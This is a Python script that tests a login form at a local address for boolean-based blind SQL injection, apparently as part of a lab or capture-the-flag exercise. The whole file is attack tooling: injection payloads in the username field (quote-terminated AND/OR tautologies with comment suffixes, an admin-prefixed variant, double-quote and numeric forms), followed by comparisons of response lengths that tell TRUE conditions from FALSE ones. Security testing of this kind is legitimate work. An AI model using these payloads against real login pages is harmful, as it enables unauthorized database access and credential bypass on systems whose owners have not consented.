import requests
import time

# Target configuration
target_url = "http://127.0.0.1:32989/index.php"

# Store all responses for comparison
results = {}

def send_request(description, username, password):
    """Send POST request and capture all details"""
    data = {
        'username': username,
        'password': password
    }
    
    start_time = time.time()
    try:
        response = requests.post(target_url, data=data, timeout=10)
        elapsed = time.time() - start_time
        
        result = {
            'description': description,
            'username': username,
            'password': password,
            'status': response.status_code,
            'content_length': len(response.content),
            'content_length_header': response.headers.get('Content-Length', 'N/A'),
            'response_time': round(elapsed, 3),
            'body': response.text
        }
        return result
    except Exception as e:
        return {
            'description': description,
            'username': username,
            'password': password,
            'error': str(e)
        }

print("=" * 80)
print("BOOLEAN-BASED BLIND SQL INJECTION TEST")
print("Target: http://127.0.0.1:32989/index.php")
print("=" * 80)

# 1. BASELINE REQUESTS
print("\n[1] BASELINE REQUESTS")
print("-" * 40)

baselines = [
    ("Normal login (admin/admin)", "admin", "admin"),
    ("Invalid login (random/random)", "random", "random"),
    ("Empty username", "", "password"),
]

for desc, user, pwd in baselines:
    result = send_request(desc, user, pwd)
    results[desc] = result
    print(f"\n{desc}")
    print(f"  Status: {result.get('status', 'ERROR')}")
    print(f"  Content-Length: {result.get('content_length', 'N/A')} bytes")
    print(f"  Response Time: {result.get('response_time', 'N/A')}s")

# 2. BOOLEAN CONDITION TESTS - Single Quote
print("\n\n[2] BOOLEAN CONDITIONS - SINGLE QUOTE STYLE")
print("-" * 40)

single_quote_tests = [
    ("TRUE: ' AND 1=1 --", "' AND 1=1 --", "anything"),
    ("FALSE: ' AND 1=2 --", "' AND 1=2 --", "anything"),
    ("TRUE: ' AND '1'='1'#", "' AND '1'='1'#", "anything"),
    ("FALSE: ' AND '1'='2'#", "' AND '1'='2'#", "anything"),
]

for desc, user, pwd in single_quote_tests:
    result = send_request(desc, user, pwd)
    results[desc] = result
    print(f"\n{desc}")
    print(f"  Payload: username={repr(user)}")
    print(f"  Status: {result.get('status', 'ERROR')}")
    print(f"  Content-Length: {result.get('content_length', 'N/A')} bytes")
    print(f"  Response Time: {result.get('response_time', 'N/A')}s")

# 3. BOOLEAN CONDITIONS - With Admin Prefix
print("\n\n[3] BOOLEAN CONDITIONS - WITH ADMIN PREFIX")
print("-" * 40)

admin_prefix_tests = [
    ("TRUE: admin' AND 1=1 --", "admin' AND 1=1 --", "anything"),
    ("FALSE: admin' AND 1=2 --", "admin' AND 1=2 --", "anything"),
    ("TRUE: admin' AND '1'='1'#", "admin' AND '1'='1'#", "anything"),
    ("FALSE: admin' AND '1'='2'#", "admin' AND '1'='2'#", "anything"),
]

for desc, user, pwd in admin_prefix_tests:
    result = send_request(desc, user, pwd)
    results[desc] = result
    print(f"\n{desc}")
    print(f"  Payload: username={repr(user)}")
    print(f"  Status: {result.get('status', 'ERROR')}")
    print(f"  Content-Length: {result.get('content_length', 'N/A')} bytes")
    print(f"  Response Time: {result.get('response_time', 'N/A')}s")

# 4. BOOLEAN CONDITIONS - Double Quote
print("\n\n[4] BOOLEAN CONDITIONS - DOUBLE QUOTE STYLE")
print("-" * 40)

double_quote_tests = [
    ('TRUE: " AND 1=1 --', '" AND 1=1 --', "anything"),
    ('FALSE: " AND 1=2 --', '" AND 1=2 --', "anything"),
    ('TRUE: " AND "1"="1"#', '" AND "1"="1"#', "anything"),
    ('FALSE: " AND "1"="2"#', '" AND "1"="2"#', "anything"),
]

for desc, user, pwd in double_quote_tests:
    result = send_request(desc, user, pwd)
    results[desc] = result
    print(f"\n{desc}")
    print(f"  Payload: username={repr(user)}")
    print(f"  Status: {result.get('status', 'ERROR')}")
    print(f"  Content-Length: {result.get('content_length', 'N/A')} bytes")
    print(f"  Response Time: {result.get('response_time', 'N/A')}s")

# 5. BOOLEAN CONDITIONS - Numeric (No Quote)
print("\n\n[5] BOOLEAN CONDITIONS - NUMERIC (NO QUOTE)")
print("-" * 40)

numeric_tests = [
    ("TRUE: AND 1=1", "AND 1=1", "anything"),
    ("FALSE: AND 1=2", "AND 1=2", "anything"),
    ("TRUE: OR 1=1", "OR 1=1", "anything"),
    ("FALSE: OR 1=2", "OR 1=2", "anything"),
]

for desc, user, pwd in numeric_tests:
    result = send_request(desc, user, pwd)
    results[desc] = result
    print(f"\n{desc}")
    print(f"  Payload: username={repr(user)}")
    print(f"  Status: {result.get('status', 'ERROR')}")
    print(f"  Content-Length: {result.get('content_length', 'N/A')} bytes")
    print(f"  Response Time: {result.get('response_time', 'N/A')}s")

# 6. COMPARISON ANALYSIS
print("\n\n[6] RESPONSE COMPARISON ANALYSIS")
print("=" * 80)

# Group by content length
content_lengths = {}
for desc, result in results.items():
    if 'content_length' in result:
        length = result['content_length']
        if length not in content_lengths:
            content_lengths[length] = []
        content_lengths[length].append(desc)

print("\nContent-Length Groups:")
for length, descriptions in sorted(content_lengths.items()):
    print(f"\n  {length} bytes:")
    for desc in descriptions:
        print(f"    - {desc}")

# Check for TRUE vs FALSE differences
print("\n\n[7] TRUE vs FALSE CONDITION COMPARISON")
print("=" * 80)

# Compare specific pairs
pairs_to_compare = [
    ("TRUE: ' AND 1=1 --", "FALSE: ' AND 1=2 --"),
    ("TRUE: ' AND '1'='1'#", "FALSE: ' AND '1'='2'#"),
    ("TRUE: admin' AND 1=1 --", "FALSE: admin' AND 1=2 --"),
    ("TRUE: admin' AND '1'='1'#", "FALSE: admin' AND '1'='2'#"),
]

print("\nComparing TRUE vs FALSE conditions:")
differences_found = False

for true_desc, false_desc in pairs_to_compare:
    if true_desc in results and false_desc in results:
        true_result = results[true_desc]
        false_result = results[false_desc]
        
        print(f"\n  {true_desc} vs {false_desc}")
        
        true_len = true_result.get('content_length', 0)
        false_len = false_result.get('content_length', 0)
        
        if true_len != false_len:
            print(f"    [*] DIFFERENCE DETECTED!")
            print(f"        TRUE:  {true_len} bytes")
            print(f"        FALSE: {false_len} bytes")
            differences_found = True
        else:
            print(f"    [ ] Same: {true_len} bytes")

if not differences_found:
    print("\n  [!] No content-length differences detected between TRUE/FALSE conditions")

# 8. PRINT SAMPLE RESPONSE BODIES
print("\n\n[8] SAMPLE RESPONSE BODIES (First 500 chars)")
print("=" * 80)

sample_tests = [
    "Normal login (admin/admin)",
    "TRUE: admin' AND 1=1 --",
    "FALSE: admin' AND 1=2 --"
]

for test in sample_tests:
    if test in results and 'body' in results[test]:
        print(f"\n{test}:")
        print("-" * 40)
        body = results[test]['body'][:500]
        print(body)
        if len(results[test]['body']) > 500:
            print("... [truncated]")

print("\n\n[9] SUMMARY")
print("=" * 80)
print(f"Total requests sent: {len(results)}")
print(f"Unique content lengths: {len(content_lengths)}")
if len(content_lengths) == 1:
    print("[!] All responses have identical content length - boolean-based blind SQLi")
    print("    may not be detectable via content-length differences")
else:
    print(f"[*] Found {len(content_lengths)} different content lengths - potential for boolean-based detection")

